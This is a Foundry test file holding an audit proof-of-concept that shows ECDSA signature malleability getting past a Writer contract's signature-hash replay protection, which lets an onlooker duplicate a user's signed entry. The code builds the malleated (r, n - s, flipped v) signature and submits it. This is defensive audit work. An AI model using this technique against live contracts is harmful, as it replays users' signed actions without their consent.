// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, Vm} from "forge-std/Test.sol";
import {Writer} from "../src/Writer.sol";
import {WriterStorage} from "../src/WriterStorage.sol";

/// @title Audit findings - proof-of-concept tests
/// @notice Each test in this file demonstrates a security finding from the
///         pre-launch audit. They are intended to FAIL on the current code
///         (i.e. they prove the bug exists) and PASS once the corresponding
///         fix lands.
contract AuditTest is Test {
    Vm.Wallet internal user;
    uint256 internal userPrivateKey;

    Writer internal writer;
    WriterStorage internal store;

    function setUp() public {
        userPrivateKey = uint256(keccak256(abi.encodePacked("AUDIT_USER_PRIVATE_KEY")));
        user = vm.createWallet(userPrivateKey);

        address[] memory managers = new address[](1);
        managers[0] = user.addr;

        store = new WriterStorage();
        writer = new Writer("Audit Writer", address(store), user.addr, managers);
        store.setLogic(address(writer));
    }

    // -------------------------------------------------------------------------
    // C-2: ECDSA signature malleability bypasses replay protection
    //
    // signatureWasExecuted is keyed off keccak256(signature_bytes). ECDSA
    // produces a second valid signature (r, n - s, v ^ 1) for the same digest
    // and signer. That second form has different bytes and therefore a
    // different keccak256, so the replay check passes a second time and the
    // operation runs again.
    //
    // The most damaging instance is createWithChunkWithSig: a watcher who sees
    // any legitimate signature can produce a duplicate entry authored by the
    // original signer.
    // -------------------------------------------------------------------------
    function test_C2_MalleabilityBypassesReplayProtection() public {
        uint256 nonce = 0;
        uint256 chunkCount = 1;
        string memory content = "private journal entry";

        bytes32 structHash = keccak256(
            abi.encode(
                writer.CREATE_WITH_CHUNK_TYPEHASH(),
                nonce,
                chunkCount,
                keccak256(abi.encodePacked(content))
            )
        );
        bytes32 digest = _eip712Digest(structHash);

        // Foundry's vm.sign uses RFC-6979 deterministic signing, which happens
        // to produce a low-S signature. This is the "polite" form an honest
        // wallet would emit.
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
        bytes memory sigOriginal = abi.encodePacked(r, s, v);

        // The malleated form: s' = n - s, and the recovery byte flips.
        // n is the order of secp256k1. v is 27 or 28 here (not 0/1), so the
        // flip is `27 <-> 28`, NOT `v ^ 1` (which would yield 26 or 29 and
        // be rejected by ecrecover).
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 sMalleated = bytes32(n - uint256(s));
        uint8 vMalleated = v == 27 ? 28 : 27;
        bytes memory sigMalleated = abi.encodePacked(r, sMalleated, vMalleated);

        // Sanity: the two byte sequences are distinct, so the replay set
        // (keyed by keccak256(signature)) treats them as separate signatures.
        assertTrue(
            keccak256(sigOriginal) != keccak256(sigMalleated),
            "malleated signature should have a different byte hash"
        );

        // Sanity: both signatures recover the same author and would be
        // accepted by ecrecover (the contract's _getSigner does not enforce
        // low-S, so the malleated form is also "valid").
        assertEq(ecrecover(digest, v, r, s), user.addr);
        assertEq(ecrecover(digest, vMalleated, r, sMalleated), user.addr);

        // First call: a legitimate user (or relay on their behalf) submits
        // sigOriginal. Entry 0 is created.
        writer.createWithChunkWithSig(sigOriginal, nonce, chunkCount, content);
        assertEq(writer.getEntryCount(), 1);

        // Second call: an attacker (mempool watcher, relay operator, anyone
        // who saw sigOriginal) submits sigMalleated. With the bug present,
        // this SUCCEEDS and creates a duplicate entry authored by `user`
        // without the user ever consenting to a second write.
        //
        // After applying the C-2 fix this call should revert. Replace the
        // direct call below with the expectRevert block to convert this from
        // a "bug exists" PoC into a regression test.
        //
        //     vm.expectRevert("Writer: Signature has already been executed");
        //     writer.createWithChunkWithSig(sigMalleated, nonce, chunkCount, content);
        //     assertEq(writer.getEntryCount(), 1);
        writer.createWithChunkWithSig(sigMalleated, nonce, chunkCount, content);

        // Bug confirmed: a duplicate entry now exists, both authored by `user`,
        // both with identical content, indistinguishable from a legitimate
        // double-submit.
        assertEq(writer.getEntryCount(), 2, "C-2 bug: duplicate entry created via malleability");

        WriterStorage.Entry memory entry0 = writer.getEntry(0);
        WriterStorage.Entry memory entry1 = writer.getEntry(1);
        assertEq(entry0.author, user.addr);
        assertEq(entry1.author, user.addr);
        assertEq(entry0.chunks[0], content);
        assertEq(entry1.chunks[0], content);
    }

    /// @dev Recompute the EIP-712 digest exactly the way VerifyTypedData does
    ///      internally. Mirrors the logic in VerifyTypedData.sol's constructor
    ///      + getSigner, so this test does not depend on any view function
    ///      that the contract does not already expose.
    function _eip712Digest(bytes32 structHash) internal view returns (bytes32) {
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(abi.encodePacked(writer.DOMAIN_NAME())),
                keccak256(abi.encodePacked(writer.DOMAIN_VERSION())),
                block.chainid,
                address(writer)
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}
